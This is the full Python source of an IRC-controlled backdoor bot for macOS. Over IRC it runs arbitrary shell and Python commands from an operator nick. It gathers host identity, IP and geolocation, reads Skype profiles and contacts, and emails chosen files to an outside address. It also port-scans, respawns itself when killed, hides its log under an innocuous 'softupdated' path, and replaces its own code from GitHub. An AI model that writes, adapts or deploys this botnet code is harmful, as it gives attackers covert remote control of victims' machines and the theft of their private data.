# -*- coding: utf-8 -*-
# MIT Liscence
version = "8.1"                                                                 # bot version

# library imports
import os, sys, socket, signal, time, platform      # general
import getpass, random, uuid, urllib2               # identification
import unicodedata, json                            # encoding and decoding

from subprocess import Popen, PIPE, STDOUT          # command execution
from time import strftime, sleep                    # timing
from StringIO import StringIO                       # output redirection for logging

from modules.logging import logfile, log

#TODO: make portscan timeout or cancellable
#TODO: make run fully interactive by capturing input and using p.write() or p.stdin()
#TODO: modules:
#       download    will download the file at the given url and save it to the host machine
#       send_file   streams the file on the host computer to the given host:port
#       status      returns the size of the worker's task queue
#       openvpn     implement openvpn for firewall evasion
#       reverse ssh ssh botnet implementation

try:
    logfile(filename="/var/softupdated/bot_v%s(%s).log" % (version, strftime("%m-%d|%H:%M")))                  # redirects bot output to logfile
except Exception as e:
    print e

log("[*] IRC BOT v%s" % version)

############ Variables

server = 'irc.freenode.net'
port = 6667
channel = '##medusa'
source_checking_enabled = True
allowed_sources = ["thesquash"]                                                 # only accept commands from these nicks
admin = 'thesquash'                                                             # the nick to send privmsgs to by default

hostname = socket.gethostname()                                                 # host's hostname
main_user = os.popen("stat -f '%Su' /dev/console").read().strip()               # main user of the computer detected by current owner of /dev/console

if main_user == "root":
    main_user = os.popen("ps aux | grep CoreServices/Finder.app | head -1 | awk '{print $1}'").read().strip()

main_user_full = os.popen("finger %s | awk -F: '{ print $3 }' | head -n1 | sed 's/^ //'" % main_user).read().strip()
if len(main_user_full) < 1:
    main_user_full = main_user

local_user = getpass.getuser()                                                  # user the bot is running as

nick = '[%s]' % main_user_full.replace(" ", "")[:14]                            # bot's nickname

############ Flow functions

def timeout_handler(signum, frame):                                             # handler for timeout exceptions
    raise Exception("Timeout Alarm: %s %s" % (signum, frame))

def sigterm_handler(signum, frame):                                             # if user tries to kill python process, it will spawn another one
    log('[#] ----Host attempted to shutdown bot----')
    log('[#] ----Spawning subprocess----')
    privmsg("----Host attempted to shutdown bot----")
    quit_status = True
    cmd = "sleep 15; python bot.py &"
    log('[>]    CMD:     ',cmd)
    p = Popen([cmd],shell=True,executable='/bin/bash')
    log('[#] ----Subprocess Spawned----')
    privmsg('----Subprocess Spawned----')
    irc.send ( 'QUIT\r\n' )
    raise SystemExit                                                
    sys.exit()

def line_split(lines_to_split, n):                                              # if output is multiline, split based on \n and max chars per line (n)
    output = []
    if (lines_to_split.find('\n') == -1):
        output.append(lines_to_split)
    else:
        while (lines_to_split.find('\n') != -1):
            output.append(lines_to_split.split("\n", 1)[0])
            lines_to_split = lines_to_split.split("\n", 1)[1]
    splitout = []
    for line in output:
        while line:
            splitout.append(line[:n])
            line = line[n:]
    return splitout

############ IRC functions

def parse(data):
    if data.find("PRIVMSG") != -1:
        from_nick = data.split("PRIVMSG ",1)[0].split("!")[0][1:] # who sent the PRIVMSG
        to_nick = data.split("PRIVMSG ",1)[1].split(" :",1)[0]  # where did they send it
        text = data.split("PRIVMSG ",1)[1].split(" :",1)[1].strip()  # what did it contain
        if source_checking_enabled and (from_nick not in allowed_sources and from_nick != admin):
            log("[>]     Not from an allowed source. (source checking enabled)")
            return (False,"","")                     # break and return nothing if message is invalid
        if to_nick == channel:
            source = "public"
            return_to = channel
        elif to_nick != channel:
            source = "private"
            return_to = from_nick
        log("[>]     Content: %s, Source: %s, Return To: %s" % (text, source, return_to))
        return (text, source, return_to)
    elif data.find("PING :",0,6) != -1:               # was it just a ping?
        from_srv = data.split("PING :")[1].strip()    # the source of the PING
        return ("PING", from_srv, from_srv)
    return (False,"","")                         # break and return nothing if message is invalid

def privmsg(msg=None, to=admin):                                                # function to send a private message to a user, defaults to master of bots!
    if type(msg) is unicode:
        msg = unicodedata.normalize('NFKD', msg).encode('ascii','ignore')
    elif type(msg) is not str or unicode:
        msg = str(msg).strip()
    if len(msg) < 1:
        pass
    elif (len(msg) > 480) or (msg.find('\n') != -1):
        log('[+] Sent Data:')
        log('[#] Starting multiline output.')
        msgs = line_split(msg, 480)                                             # use line_split to split output into multiple lines based on max message length (480)
        total = len(msgs)
        for num, line in enumerate(msgs):
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(1)                                                     # doubles as flood prevention wait and input checking
            try:
                data = irc.recv(4096)
            except:
                data = ""
                pass
            signal.alarm(0)
            if (data.find('!stop') != -1):
                log('[+] Recieved:')
                log('[>]    ', data.strip())
                retcode = "Stopped buffered multiline output."
                privmsg("[X]: %s" % retcode, to)
                break
            log('[<]    PRIVMSG %s :[%s/%s] %s\r' % (to, num+1, total, line))
            irc.send ('PRIVMSG %s :[%s/%s] %s\r\n' % (to, num+1, total, line))  # [1/10] = Output line 1 out of 10 total
        log('[#] Finished multiline output.')     
    else:
        log('[+] Sent Data:')
        log('[<]    PRIVMSG %s :%s\r' % (to, msg))
        irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))

def broadcast(msg):                                                             # function to send a message to the main channel
    privmsg(msg, channel)

def still_connected(irc):
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(3)
    try:
        log('[#] Testing Connection.')
        log('[>] Sent:')
        log('[>]    PING TEST')
        sent_time = time.time()
        irc.send('PING TEST\r\n')
        found = False
        while not found:   
            data = irc.recv(4096)   
            if data.find("PONG") != -1:
                latency = str(round((time.time() - sent_time)*1000, 2))+"ms"
                signal.alarm(0)
                found = True
        log('[#] Latency: %s' % latency)
        return (True, latency)
    except Exception as pong_exception:
        signal.alarm(0)
        log("[X] PING/PONG Failed: %s" % pong_exception)
        return (False, "X: %s" % pong_exception)

def reload_bot():
    log('[#] ----Reloading Bot----')
    privmsg('----Reloading Bot from file bot.py----')
    cmd = "sleep 5; python bot.py &"
    log('[>]    CMD:     ',cmd)
    p = Popen([cmd],shell=True,executable='/bin/bash')
    log('[#] ----New Process Spawned----')
    privmsg('----New Process Spawned----')
    quit_status = True
    irc.send('QUIT\r\n')
    raise SystemExit                                              
    sys.exit()

############ Keyword functions

from modules import skype
from modules import network
from modules import communication

def geo_locate(ip="",with_proxy=False):                                         # fetch location based on IP
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(5)
    try:
        if with_proxy:
            geo_json = urllib2.urlopen('http://freegeoip.net/json/').read()
        else:
            proxy_handler = urllib2.ProxyHandler({})
            opener = urllib2.build_opener(proxy_handler)
            req = urllib2.Request('http://freegeoip.net/json/%s' % ip)
            r = opener.open(req)
            geo_json = r.read()
    except Exception as e:
        signal.alarm(0)
        if str(e).find("404") != -1:
            return ["No location info available for IP","","","","",""]
        return ["failed: %s" % e,"","","","",""]
    signal.alarm(0)

    geo = json.loads(geo_json)

    city = geo[u"city"].encode('utf-8')
    region = geo[u"region_name"].encode('utf-8')
    country = geo[u"country_name"].encode('utf-8')
    zipcode = geo[u"zipcode"].encode('utf-8')

    lat = geo[u"latitude"]
    lng = geo[u"longitude"]

    return [city,country,region,zipcode,lat,lng]

def status_report(irc, connection_time, reconnects, last_ping):
    ping = round(time.time() - last_ping, 1)
    connected = round(time.time() - connection_time, 1)
    ping_speed = still_connected(irc)[1]
    return "[v%s] connected[%ss] reconnects[%s] last_ping[%ss ago] ping_speed[%s]" % (version, connected, reconnects, ping, ping_speed)

def identify():                                                                 # give some identifying info about the host computer
    log('[+] Running v%s Identification Modules...' % version)
    system = platform.mac_ver()[0]
    if len(str(system)) < 1:
        system = platform.platform()
        log('[>]    System:    ',system)
    else:
        log('[>]    OS X:    ',system)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8",80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception as ip_error:
        local_ip = ip_error
    log('[>]    Local:   ',local_ip)
    try:
        public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
    except Exception as url_error:
        public_ip = url_error
    log('[>]    Public:  ',public_ip)
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    log('[>]    MAC:     ',mac_addr)
    return "[v%s/x%s] %s %s l: %s p: %s MAC: %s" % (version, system.strip(), main_user_full.ljust(20), (main_user[:14]+"@"+hostname[:13]).ljust(30), local_ip.ljust(16), public_ip.ljust(16), mac_addr)
 
def full_identify():                                                            # give verbose identifying info about the host computer
    log('[+] Running v%s Identification Modules...' % version)
    privmsg('[+] Running v%s Identification Modules...' % version)
    system = platform.mac_ver()[0]
    if len(str(system)) < 1:
        system = platform.platform()
        log('[>]    System:    ', system)
        privmsg('[>]      System:    %s' % system)
    else:
        log('[>]    OS X:    ', system)
        privmsg('[>]      OS X:    %s' % system)

    log('[>]    Bot:    ', local_user)
    privmsg('[>]      Bot:    %s' % local_user)

    log('[>]      User:    %s (%s)' % (main_user_full, main_user))
    privmsg('[>]      User:    %s (%s)' % (main_user_full, main_user))

    log('[>]    Host:    ', hostname)
    privmsg('[>]      Host:    %s' % hostname)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8",80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception as ip_error:
        local_ip = ip_error
    log('[>]    Local:   ', local_ip)
    privmsg('[>]      Local:   %s' % local_ip)
    try:
        public_ip = urllib2.urlopen('http://checkip.dyndns.org:8245/').read().split(": ")[1].split("<")[0].strip()
    except Exception as url_error:
        public_ip = url_error
    log('[>]    Public:  ', public_ip)
    privmsg('[>]      Public:  %s' % public_ip)
    
    mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
    log('[>]    MAC:     ', mac_addr)
    privmsg('[>]      MAC:     %s' % mac_addr)
    
    cmd = "system_profiler SPPowerDataType | grep Connected"
    for line in run_shell(cmd):
        log('[>]    Power:    ', line)
        privmsg('[>]      Power:    %s' % line)
    
    cmd = "uptime"
    for line in run_shell(cmd):
        log('[>]    UP:    ', line)
        privmsg('[>]      Up:    %s' % line)

    geo_info = geo_locate()
    location = geo_info[0]+", "+geo_info[1]+" ("+str(geo_info[4])+", "+str(geo_info[5])+")"

    log('[>]    Geoip:    ', location)
    privmsg('[>]      Location:    %s' % location)

    try:
        db_path = skype.findProfiles(main_user)
        log('[>]    Skype:    ')
        privmsg('[>]      Skype:')
        for line in skype.skypeProfile(db_path):
            log('[>]              ', line)
            privmsg('[>]         %s' % line)
            sleep(1)
    except:
        log('[>]    Skype:    None Found.')
        privmsg('[>]      Skype:    None Found.')
    
    cmd = "system_profiler SPHardwareDataType"
    log('[>]    CMD:     ',cmd)
    p = Popen([cmd],shell=True, stdout=PIPE, stderr=STDOUT, executable='/bin/bash')
    hardware = p.stdout.read()
    log('[>]    Hardware.')
    privmsg(str(hardware))
    
    privmsg('[√] Done.')

def run_shell(cmd, timeout=60, verbose=False):                                  # run a shell command and return the output, verbose enables live command output via yield
    retcode = None
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    try:
        p = Popen([cmd],shell=True, stdout=PIPE, stderr=STDOUT, executable='/bin/bash')
        log("[$]   Started.")
        continue_running = True
    except Exception as e:
        yield("Failed: %s" % e)
        continue_running = False
    signal.alarm(0)
    while continue_running:
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(1)
        try:
            line = p.stdout.readline()
            if verbose: yield(line)
            else: yield(line.strip())
        except:
            pass
        signal.alarm(0)
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(1)
        try:
            log('[#] Checking for input.')
            data = irc.recv(4096)
        except Exception as e:
            data = ""
            retcode = p.poll()  #returns None while subprocess is running
        signal.alarm(0)

        if (data.find('!cancel') != -1):
            log('[+] Recieved:')
            log('[>]    ', data.strip())
            retcode = "Cancelled live output reading. You have to kill the process manually."
            yield("[X]: %s" % retcode)
            continue_running = False
            break

        elif retcode is not None:
            signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(1)
            try:
                line = p.stdout.read()
            except:
                retcode = "Too much output, read timed out. Process is still running in background."
            signal.alarm(0)
            if verbose and len(line) > 0: 
                yield(line)
            if retcode != 0:
                yield("[X]: %s" % retcode)
            elif retcode == 0 and verbose:
                yield("[√]")
            continue_running = False
            break

def run_python(cmd, timeout=60):                                                # interactively interprets recieved python code
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(timeout)
    try:
        try:
            buffer = StringIO()
            sys.stdout = buffer
            exec(cmd)
            sys.stdout = sys.__stdout__
            out = buffer.getvalue()
        except Exception as error:
            out = error
        out = str(out).strip()
        if len(out) < 1:
            try:
                out = "[eval]: "+str(eval(cmd))
            except Exception as error:
                out = "[eval]: "+str(error)
        else:
            out = "[exec]: "+out
    except Exception as python_exception:
        out = "[X]: %s" % python_exception
    signal.alarm(0)
    return out.strip()

def run(cmd, public=False, return_to=admin):                                    # wrapper for run_shell which improves logging and responses
    def respond(content):
        if public:
            broadcast(content)
        else:
            privmsg(content,return_to)
    out = ''
    cmd = cmd.strip()
    log("[+] Ran Command:")
    log("[$]   CMD: ", [cmd])
    for line in run_shell(cmd, verbose=True):
        respond(line)
    log('[#] Done.')
    split = line_split(out, 480)
    ttl = len(split)
    for idx, line in enumerate(split):
        log("[>]   OUT [%s/%s]: " % (idx+1,ttl), line)
        log("\n")

def selfupdate(git_user="nikisweeting",git_repo="python-medusa"):               # updates the bot by downloading new source from github
    log('[*] Starting Selfupdate...')
    privmsg('[+] Starting v%s selfupdate...' % version)

    privmsg('[#]   Preparing...')
    cmd = "mkdir -p /private/var/softupdated; rm -Rf /private/var/softupdated/code.zip /private/var/softupdated/code;"
    for line in run_shell(cmd, timeout=10, verbose=True):
        log('[>]    ',line)
        privmsg('[>]    %s' % line)

    privmsg('[#]   Downloading...')
    cmd = "curl https://codeload.github.com/%s/%s/zip/master > /private/var/softupdated/code.zip" % (git_user, git_repo)
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(60)
    try:
        for line in run_shell(cmd, timeout=60, verbose=True):
            log('[>]    ',line)
            privmsg('[>]    %s' % line)
            if line.find("[X]") != -1:
                sleep(1)
                privmsg("[X]   Download failed. Try again later.")
                return 1
    except:
        signal.alarm(0)
        sleep(1)
        privmsg("[X]   Download failed. Try again later.")
        return 1
    signal.alarm(0)

    privmsg('[#]   Unzipping...')
    cmd = "unzip -oq /private/var/softupdated/code.zip -d /private/var/softupdated/code"
    for line in run_shell(cmd, timeout=70, verbose=True):
        log('[>]    ',line)
        privmsg('[>]    %s' % line)

    privmsg('[#]   Copying files...')
    cmd = "cp -Rf /private/var/softupdated/code/*/* /private/var/softupdated/ && rm -f /private/var/softupdated/code.zip && rm -Rf /private/var/softupdated/code"
    for line in run_shell(cmd, timeout=60, verbose=True):
        log('[>]    ',line)
        privmsg('[>]    %s' % line)
    
    privmsg('[#]   Removing downloaded source...')
    cmd = "rm -f /private/var/softupdated/code.zip && rm -Rf /private/var/softupdated/code"
    for line in run_shell(cmd, timeout=30, verbose=True):
        log('[#]    ',line)
        privmsg('[>]    %s' % line)

    sleep(1)
    privmsg("[√] Relaunching to finish update.")
    sleep(3)
    reload_bot()

def admin(admins):
    for entry in admins:
        allowed_sources.append(entry)

def unadmin(admins):
    for entry in admins:
        if entry in allowed_sources:
            allowed_sources.remove(entry)

############ The beef of things
if __name__ == '__main__':
    if len(nick) > 15: 
        nick = '[%s]' % main_user_full.replace(" ", "")[:13]                                        # if nick is over 15 characters, change to username truncated at 13 chars
    elif len(nick) < 5:
        nick = '[%s]' % main_user_full.replace(" ", "")
        if len(nick) > 15: 
            nick = nick[:14]+']'                                                # if nick is over 15 characters, truncate
        elif len(nick) < 5:
            nick += str(random.randint(1,200))

    threshold = 8 * 60                                                          # maximum time between pings before assuming disconnected (in seconds)
    quit_status = False
    reconnects = -1

    while not quit_status:                                                      # connection loop
        signal.signal(signal.SIGTERM, sigterm_handler)
        try:
            timeout_count = 0
            last_ping = time.time()                                             # last ping recieved
            last_data = data = ''
            log("[+] Connecting...")
            log("[<]    Nick:        ", nick)
            log("[<]    Server:      ", server+':'+str(port))
            log("[<]    Room:        ", channel)
            try:
                irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                irc.settimeout(60)                                              # timeout for irc.recv
                irc.connect((server, port))
                reconnects += 1
                connection_time = time.time()
                recv = irc.recv(4096)
                log("[+] Recieved:    ", recv+'\n')
                irc.send('NICK %s\r\n' % nick )
                irc.send('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
                irc.send('JOIN %s\r\n' % channel)
                try:
                    privmsg('Bot reloaded due to internal exception: %s' % exit_exception)
                    del exit_exception
                except NameError:
                    pass
            except Exception as error:
                log('[*] Connection Failed: ')
                log('[X]    ',error)
                timeout_count = 50
                sleep(20)

            while not quit_status and (timeout_count < 50):                     # data receiving loop
                try:
                    data = irc.recv(4096)
                    log('[+] Recieved:')
                    log('[>]    ', data.strip())
                    if (last_data == data):                                     # IRC servers  will occasionally send lots of blank messages instead of disconnecting
                        timeout_count += 1       
                    else:
                        timeout_count = 0  
                    last_data = data    
                except socket.timeout:
                    if time.time() - last_ping > threshold:                     # if reciving data times out and ping threshold is exceeded
                        quit_status = False
                        timeout_count = 50
                        break
                    else:
                        data = str(time.time())
                        timedout_count = 0

                if len(data) < 1 or timeout_count > 5:                          # check connection when instability is detected or a blank message is recieved from the server
                    if still_connected(irc):
                        timeout_count = 0
                    else:
                        quit_status = False
                        timedout_count = 50
                        break

                if data.find('ickname is already in use') != -1:
                    nick += str(random.randint(1,200))
                    if len(nick) > 15: nick = '[%s]%s' % (main_user[:11], random.randint(1,99))
                    timeout_count = 50
                    quit_status = False
                    break

                parsed_data = parse(data)

                content = parsed_data[0]
                source = parsed_data[1]
                return_to = parsed_data[2]

                if content != False:
                    timeout_count = 0
                    if content == 'PING' and (len(source) > 0):
                        irc.send('PONG ' + source + '\r')
                        last_ping = time.time()
                        log('[+] Sent Data:')
                        log('[<]    PONG ',source)
                        timeout_count = 0

                    ##Control keyword matches
                    elif content == '!quit' or content == 'quit':
                        privmsg('Quitting.')
                        irc.send('QUIT\r\n')
                        quit_status = True

                    elif content == '!reconnect' or content == 'reconnect':
                        privmsg('Reconnecting.')
                        irc.send('QUIT\r\n')
                        quit_status = False
                        break

                    elif source == 'public':
                        if content == '!version':
                            broadcast("v"+version)

                        elif content == '!identify':
                            broadcast(identify())

                        elif content == '!update':
                            selfupdate()

                        elif content == '!reload':
                            reload_bot()

                        elif content == '!status':
                            broadcast(status_report(irc, connection_time, reconnects, last_ping))

                        elif content == '!geo':
                            location = str(geo_locate())
                            broadcast(location)

                        elif content == '!skype':
                            try:
                                output = ""
                                for line in skype.skypeProfile(skype.findProfiles(main_user)):
                                    if line[:3] != "['/" and line != "[*] -- Found Account --":
                                        output += line
                                broadcast(output)
                            except Exception as error:
                                broadcast(str(error))

                        elif content == '!portscan':
                            log("[+] Starting Portscan of localhost.")
                            for line in network.portscan('localhost'):
                                log("[>]    %s" % line)
                                if str(line)[:1] == "[":
                                    broadcast(line)
                            log("[+] Finished Portscan.")

                        elif content[:6] == 'admin$':
                            admins = content[6:].split(',')
                            admin(admins)
                            broadcast("Admin List: %s" % allowed_sources)

                        elif content[:8] == 'unadmin$':
                            admins = content[8:].split(',')
                            unadmin(admins)
                            broadcast("Admin List: %s" % allowed_sources)

                        elif content[:6] == 'email$':
                            attch = content[6:].split(',')
                            to = "nikisweeting+bot@gmail.com"
                            broadcast(communication.email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))

                        elif content[:9] == 'portscan$':
                            log("[+] Starting Portscan of %s." % content[9:])
                            for line in network.portscan(content[9:]):
                                log("[>]    %s" % line)
                                if str(line)[:1] == "[":
                                    broadcast(line)
                            log("[+] Finished Portscan.")

                        elif content[:1] == '$':
                            cmd = content[1:]
                            run(cmd, public=True)

                        elif content[:3] == '>>>':
                            cmd = content[3:]
                            try:
                                broadcast(run_python(cmd))
                            except Exception as python_exception:
                                broadcast("[X]: %s" % python_exception)

                    elif source == 'private':
                        if content == 'version':
                            privmsg("v"+version,to=return_to)

                        elif content == 'identify':
                            full_identify()

                        elif content == 'update':
                            selfupdate()

                        elif content == 'reload':
                            reload_bot()

                        elif content == 'status':
                            privmsg(status_report(irc, connection_time, reconnects, last_ping))

                        elif content == 'geo':
                            location_with_proxy = str(geo_locate(with_proxy=True))
                            location = str(geo_locate())
                            if location_with_proxy == location:
                                privmsg("Location: %s" % location,to=return_to)
                            else:
                                privmsg("Proxy Detected: %s" % location_with_proxy,to=return_to)
                                sleep(1)
                                privmsg("Actual Location: %s" % location,to=return_to)

                        elif content == 'skype':
                            try:
                                paths = skype.findProfiles()
                                privmsg(paths, to=return_to)
                                for line in skype.skypeProfile(paths):
                                    privmsg(line, to=return_to)
                                    sleep(1)
                            except Exception as error:
                                privmsg(str(error), to=return_to)

                        elif content == 'skype$contacts':
                            try:
                                db_path = skype.findProfiles(main_user)
                                for line in skype.skypeProfile(db_path):
                                    privmsg(line, to=return_to)
                                    sleep(1)
                                for line in skype.printContacts(db_path):
                                    signal.signal(signal.SIGALRM, timeout_handler)
                                    signal.alarm(1)                              # doubles as flood prevention and input checking
                                    try:
                                        data = irc.recv(4096)
                                        log('[+] Recieved:')
                                        log('[>]    ', data.strip())
                                        if (data.find('!cancel') != -1):
                                            retcode = "Cancelled."
                                            privmsg("[X]: %s" % retcode, to=return_to)
                                            signal.alarm(0)
                                            break
                                    except:
                                        privmsg(line, to=return_to)
                                    signal.alarm(0)

                            except Exception as error:
                                privmsg(str(error), to=return_to)

                        elif content == 'portscan':
                            log("[+] Starting Portscan of localhost.")
                            for line in network.portscan('localhost'):
                                privmsg(line, return_to)
                            log("[+] Finished Portscan.")

                        elif content[:9] == 'portscan$':
                            log("[+] Starting Portscan of %s." % content[9:])
                            for line in network.portscan(content[9:]):
                                privmsg(line, return_to)
                            log("[+] Finished Portscan.")

                        elif content[:6] == 'email$':

                            attch = content[6:].split(',')
                            to = "nikisweeting+bot@gmail.com"
                            broadcast(communication.email(to,msg="whohooo",sbj='BOT: '+nick,attch=attch))

                        elif content[:1] == '$':
                            cmd = content[1:]
                            run(cmd, public=False, return_to=return_to)

                        elif content[:3] == '>>>':
                            cmd = content[3:]
                            try:
                                privmsg(run_python(cmd), return_to)
                            except Exception as python_exception:
                                privmsg("[X]: %s" % python_exception, return_to)

        except (KeyboardInterrupt, SystemExit) as quit_reason:
            privmsg('Quitting Intentionally. %s' % quit_reason)
            irc.send('QUIT\r\n')
            break
        except RuntimeError as exit_exception:
            log("[#] ----EXCEPTION---- ",exit_exception)
        except Exception as exit_exception:
            log("[#] ----EXCEPTION---- ",exit_exception)        
    log("[*] EXIT")
    raise SystemExit(0)